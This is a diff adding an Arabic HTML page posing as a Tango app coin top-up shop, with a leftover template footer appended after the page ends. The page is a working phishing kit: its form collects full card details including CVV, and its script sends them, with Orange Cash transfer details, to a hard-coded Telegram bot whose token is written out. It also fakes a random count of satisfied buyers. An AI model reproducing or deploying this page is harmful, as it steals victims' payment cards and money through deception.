@@ -1,0 +1,276 @@
+<!DOCTYPE HTML>
+<html lang="ar" dir="rtl">
+<head>
+  <title>شحن عملات تانجو</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+  <link rel="stylesheet" href="assets/css/main.css" />
+  <noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: 'Cairo', sans-serif;
+    }
+    .payment-method {
+      background: #111;
+      border: 1px solid #444;
+      border-radius: 10px;
+      padding: 10px;
+      margin: 10px 0;
+      cursor: pointer;
+      text-align: center;
+      color: #ffffff;
+      font-weight: bold;
+    }
+    input[type="text"], input[type="file"], select {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 8px;
+      border: 1px solid #555;
+      background: #1a1a1a;
+      color: #fff;
+    }
+    .confirm-btn {
+      background: #ffffff;
+      color: #000;
+      border: none;
+      padding: 10px 20px;
+      margin-top: 15px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    #price {
+      margin-top: 10px;
+      font-size: 18px;
+      color: #fff;
+    }
+    h1, h2, h3, label, p {
+      color: #fff;
+    }
+    .icon {
+      color: #ffffff;
+    }
+    .logo span {
+      color: #ffffff;
+    }
+  </style>
+</head>
+<body class="is-preload">
+
+  <div id="wrapper">
+    <!-- Header -->
+    <header id="header">
+      <div class="logo"><span class="icon fa-gem"></span></div>
+      <div class="content">
+        <div class="inner">
+          <h1>شحن عملات تانجو</h1>
+          <p>اشحن عملاتك بسهولة باستخدام فيزا أو أورنج كاش، بأسعار مميزة</p>
+          <p id="usersCount" style="color:#ffffff; font-weight:bold; margin-top:10px;"></p>
+        </div>
+      </div>
+      <nav>
+        <ul>
+          <li><a href="#intro">حول الخدمة</a></li>
+          <li><a href="#payment">طرق الدفع</a></li>
+          <li><a href="#contact">تواصل معنا</a></li>
+        </ul>
+      </nav>
+    </header>
+
+    <!-- Main -->
+    <div id="main">
+
+      <!-- Intro -->
+      <article id="intro">
+        <h2 class="major">حول الخدمة</h2>
+        <p>نوفر شحن عملات لتطبيق تانجو بعدة طرق دفع آمنة، اختر الباقة التي تناسبك وادفع بسهولة!</p>
+      </article>
+
+      <!-- Payment -->
+      <article id="payment">
+        <h2 class="major">طرق الدفع</h2>
+
+        <label>🆔 اكتب معرف تانجو:</label>
+        <input type="text" id="tangoId" placeholder="مثال: Tango12345" />
+
+        <label>💰 اختر عدد العملات:</label>
+        <select id="coins" onchange="updatePrice()">
+          <option value="370">1,000 - 370 جنيه</option>
+          <option value="770">2,000 - 770 جنيه</option>
+          <option value="1250">3,000 - 1,250 جنيه</option>
+          <option value="1500">4,000 - 1,500 جنيه</option>
+          <option value="1920">5,000 - 1,920 جنيه</option>
+          <option value="3660">10,000 - 3,660 جنيه</option>
+          <option value="5485">15,000 - 5,485 جنيه</option>
+          <option value="7315">20,000 - 7,315 جنيه</option>
+          <option value="9090">25,000 - 9,090 جنيه</option>
+          <option value="10910">30,000 - 10,910 جنيه</option>
+          <option value="14545">40,000 - 14,545 جنيه</option>
+          <option value="18239">50,000 - 18,239 جنيه</option>
+          <option value="21950">60,000 - 21,950 جنيه</option>
+          <option value="25560">70,000 - 25,560 جنيه</option>
+          <option value="29200">80,000 - 29,200 جنيه</option>
+          <option value="36550">100,000 - 36,550 جنيه</option>
+        </select>
+        <div class="price" id="price">السعر: 370 جنيه</div>
+
+        <h2>اختر طريقة الدفع</h2>
+        <div class="payment-method" onclick="showMethod('visaBox')">💳 بطاقة فيزا / ماستركارد</div>
+        <div class="payment-method" onclick="showMethod('orangeBox')">📱 أورنج كاش</div>
+
+        <!-- Visa Payment -->
+        <div id="visaBox" style="display:none;">
+          <h3>تفاصيل البطاقة:</h3>
+          <label>الاسم على البطاقة:</label>
+          <input type="text" id="cardName" />
+          <label>رقم البطاقة:</label>
+          <input type="text" id="cardNumber" />
+          <label>تاريخ الانتهاء:</label>
+          <input type="text" id="expiryDate" />
+          <label>CVV:</label>
+          <input type="text" id="cvv" />
+          <label>الدولة:</label>
+          <input type="text" id="country" />
+          <label>الرمز البريدي:</label>
+          <input type="text" id="postalCode" />
+          <button class="confirm-btn" onclick="submitVisa()">تأكيد الدفع</button>
+        </div>
+
+        <!-- Orange Cash -->
+        <div id="orangeBox" style="display:none;">
+          <h3>📱 الدفع عبر أورنج كاش</h3>
+          <p>الرجاء تحويل المبلغ إلى الرقم:</p>
+          <p><strong>01211197166</strong></p>
+          <label>رقم المرسل:</label>
+          <input type="text" id="senderPhone" />
+          <label>المبلغ المُرسل:</label>
+          <input type="text" id="sentAmount" />
+          <label>صورة إيصال التحويل:</label>
+          <input type="file" id="receiptFile" accept="image/*" />
+          <button class="confirm-btn" onclick="submitOrange()">تأكيد الدفع</button>
+        </div>
+      </article>
+
+      <!-- Contact -->
+      <article id="contact">
+        <h2 class="major">تواصل معنا</h2>
+        <p>راسلنا لأي استفسار عبر:</p>
+        <ul class="icons">
+          <li><a href="https://wa.me/201211197166" class="icon brands fa-whatsapp"><span class="label">WhatsApp</span></a></li>
+          <li><a href="https://t.me/yourtelegram" class="icon brands fa-telegram"><span class="label">Telegram</span></a></li>
+        </ul>
+      </article>
+    </div>
+
+    <!-- Footer -->
+    <footer id="footer">
+      <p>&copy; جميع الحقوق محفوظة - شحن عملات تانجو.</p>
+    </footer>
+  </div>
+
+  <!-- Scripts -->
+  <script>
+    const BOT_TOKEN = "7383573758:AAFNvzygI3RBOGFrahpj51StQu6ekcH6fwU";
+    const CHAT_ID = "7374292521";
+
+    function updatePrice() {
+      const coinsSelect = document.getElementById("coins");
+      const selectedText = coinsSelect.options[coinsSelect.selectedIndex].text;
+      const priceOnly = selectedText.split(" - ")[1];
+      document.getElementById("price").innerText = `السعر: ${priceOnly}`;
+    }
+
+    function showMethod(methodId) {
+      document.getElementById("visaBox").style.display = "none";
+      document.getElementById("orangeBox").style.display = "none";
+      document.getElementById(methodId).style.display = "block";
+    }
+
+    function submitVisa() {
+      const tangoId = document.getElementById("tangoId").value;
+      const name = document.getElementById("cardName").value;
+      const cardNumber = document.getElementById("cardNumber").value;
+      const expiry = document.getElementById("expiryDate").value;
+      const cvv = document.getElementById("cvv").value;
+      const country = document.getElementById("country").value;
+      const postal = document.getElementById("postalCode").value;
+      const coinsText = document.getElementById("coins").options[document.getElementById("coins").selectedIndex].text;
+
+      const message = `💳 طلب شحن عن طريق فيزا:
+معرف تانجو: ${tangoId}
+الاسم: ${name}
+رقم البطاقة: ${cardNumber}
+انتهاء: ${expiry}
+CVV: ${cvv}
+الدولة: ${country}
+الرمز البريدي: ${postal}
+الباقة: ${coinsText}`;
+
+      sendToTelegram(message);
+      alert("✅ تم إرسال بيانات الفيزا إلى التليجرام.");
+    }
+
+    function submitOrange() {
+      const tangoId = document.getElementById("tangoId").value;
+      const phone = document.getElementById("senderPhone").value;
+      const amount = document.getElementById("sentAmount").value;
+      const coinsText = document.getElementById("coins").options[document.getElementById("coins").selectedIndex].text;
+
+      const message = `📱 طلب شحن عبر أورنج كاش:
+معرف تانجو: ${tangoId}
+رقم المرسل: ${phone}
+المبلغ: ${amount}
+الباقة: ${coinsText}`;
+
+      sendToTelegram(message);
+      alert("✅ تم إرسال بيانات أورنج كاش إلى التليجرام.");
+    }
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      });
+    }
+
+    // توليد رقم زوار متغير عشوائيًا بين 1200 و1700
+    document.getElementById("usersCount").innerText =
+      "🚀 " + (Math.floor(Math.random() * 500) + 1200) + " مستخدم قاموا بالشحن من خلال هذه الصفحة!";
+  </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+				<!-- Footer -->
+					<footer id="footer">
+						<p class="copyright">&copy; Untitled. Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+					</footer>
+
+			</div>
+
+		<!-- BG -->
+			<div id="bg"></div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
